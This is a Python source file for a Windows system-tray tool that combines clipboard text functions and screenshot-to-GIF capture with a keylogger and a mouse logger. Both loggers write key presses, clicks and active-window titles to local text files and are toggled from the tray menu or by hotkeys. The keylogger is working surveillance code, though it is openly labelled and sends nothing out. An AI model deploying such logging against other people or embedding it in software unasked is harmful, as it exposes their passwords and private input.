import pyperclip
import pystray
from PIL import Image, ImageDraw, ImageGrab
from threading import Thread
import keyboard
import mouse
import time
import win32gui

# ---------------------------
# --- Clipboard Functions ---
# ---------------------------
def clean_formatting():
    try:
        text = pyperclip.paste()
        pyperclip.copy(text)
        print("Clipboard formatting cleared!")
    except Exception as e:
        print(f"Error: {e}")

def clear_clipboard():
    try:
        pyperclip.copy("")
        print("Clipboard cleared!")
    except Exception as e:
        print(f"Error: {e}")

def uppercase_clipboard():
    try:
        text = pyperclip.paste()
        pyperclip.copy(text.upper())
        print("Clipboard converted to uppercase!")
    except Exception as e:
        print(f"Error: {e}")

def lowercase_clipboard():
    try:
        text = pyperclip.paste()
        pyperclip.copy(text.lower())
        print("Clipboard converted to lowercase!")
    except Exception as e:
        print(f"Error: {e}")

# ---------------------------
# --- GIF Screen Recording ---
# ---------------------------
screenshot_frames = []

def capture_screen():
    global screenshot_frames
    screenshot = ImageGrab.grab()
    screenshot_frames.append(screenshot)
    print("Screenshot captured!")

def save_gif():
    if screenshot_frames:
        filename = f"screenshots_{int(time.time())}.gif"
        screenshot_frames[0].save(
            filename,
            save_all=True,
            append_images=screenshot_frames[1:],
            duration=500,
            loop=0
        )
        print(f"GIF saved as {filename}")
        screenshot_frames.clear()
    else:
        print("No screenshots to save!")

# ---------------------------
# --- Active Window Logger ---
# ---------------------------
def get_active_window():
    hwnd = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(hwnd)

# ---------------------------
# --- Keylogger ---
# ---------------------------
key_log_file = "key_log.txt"
keylogger_running = False

def log_key(event):
    window = get_active_window()
    with open(key_log_file, "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event.name} - Window: {window}\n")

def start_keylogger():
    global keylogger_running
    if not keylogger_running:
        keyboard.on_press(log_key)
        keylogger_running = True
        print("Keylogger started!")

def stop_keylogger():
    global keylogger_running
    if keylogger_running:
        keyboard.unhook_all()
        keylogger_running = False
        print("Keylogger stopped!")

# ---------------------------
# --- Mouse Logger ---
# ---------------------------
mouse_log_file = "mouse_log.txt"
mouse_logger_running = False

def log_mouse(event_type, x, y, button=None, window=None):
    with open(mouse_log_file, "a", encoding="utf-8") as f:
        if button:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event_type} - Button: {button} at ({x},{y}) - Window: {window}\n")
        else:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {event_type} at ({x},{y}) - Window: {window}\n")

def mouse_event_handler(event):
    window = get_active_window()
    if isinstance(event, mouse.MoveEvent):
        log_mouse("Move", event.x, event.y, window=window)
    elif isinstance(event, mouse.ButtonEvent):
        action = "Pressed" if event.event_type == "down" else "Released"
        x, y = mouse.get_position()
        log_mouse(action, x, y, event.button, window=window)

def start_mouse_logger():
    global mouse_logger_running
    if not mouse_logger_running:
        mouse.hook(mouse_event_handler)
        mouse_logger_running = True
        print("Mouse logger started!")

def stop_mouse_logger():
    global mouse_logger_running
    if mouse_logger_running:
        mouse.unhook(mouse_event_handler)
        mouse_logger_running = False
        print("Mouse logger stopped!")

# ---------------------------
# --- System Tray Icon ---
# ---------------------------
def create_icon():
    width = 64
    height = 64
    image = Image.new("RGB", (width, height), color=(0, 0, 0))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0, 0, width, height), fill="black")
    draw.text((10, 20), "CB", fill="white")
    return image

def on_quit(icon, item):
    icon.stop()
    keyboard.unhook_all_hotkeys()
    stop_keylogger()
    stop_mouse_logger()

icon = pystray.Icon(
    "clipboard_manager",
    create_icon(),
    "Clipboard, Screen Recorder, Keylogger & Mouse Logger",
    menu=pystray.Menu(
        pystray.MenuItem("Clean Formatting", clean_formatting),
        pystray.MenuItem("Clear Clipboard", lambda icon, item: clear_clipboard()),
        pystray.MenuItem("Uppercase Clipboard", lambda icon, item: uppercase_clipboard()),
        pystray.MenuItem("Lowercase Clipboard", lambda icon, item: lowercase_clipboard()),
        pystray.MenuItem("Capture Screen", lambda icon, item: capture_screen()),
        pystray.MenuItem("Save GIF", lambda icon, item: save_gif()),
        pystray.MenuItem("Start Keylogger", lambda icon, item: start_keylogger()),
        pystray.MenuItem("Stop Keylogger", lambda icon, item: stop_keylogger()),
        pystray.MenuItem("Start Mouse Logger", lambda icon, item: start_mouse_logger()),
        pystray.MenuItem("Stop Mouse Logger", lambda icon, item: stop_mouse_logger()),
        pystray.MenuItem("Quit", on_quit)
    )
)

# ---------------------------
# --- Hotkeys ---
# ---------------------------
def setup_hotkeys():
    keyboard.add_hotkey("ctrl+shift+c", clean_formatting)
    keyboard.add_hotkey("ctrl+shift+x", clear_clipboard)
    keyboard.add_hotkey("ctrl+shift+u", uppercase_clipboard)
    keyboard.add_hotkey("ctrl+shift+l", lowercase_clipboard)
    keyboard.add_hotkey("ctrl+shift+s", capture_screen)
    keyboard.add_hotkey("ctrl+shift+g", save_gif)
    keyboard.add_hotkey("ctrl+shift+k", start_keylogger)
    keyboard.add_hotkey("ctrl+shift+o", stop_keylogger)
    keyboard.add_hotkey("ctrl+shift+m", start_mouse_logger)
    keyboard.add_hotkey("ctrl+shift+n", stop_mouse_logger)

# ---------------------------
# --- Run Tray ---
# ---------------------------
def run_tray():
    setup_hotkeys()
    icon.run()

Thread(target=run_tray).start()
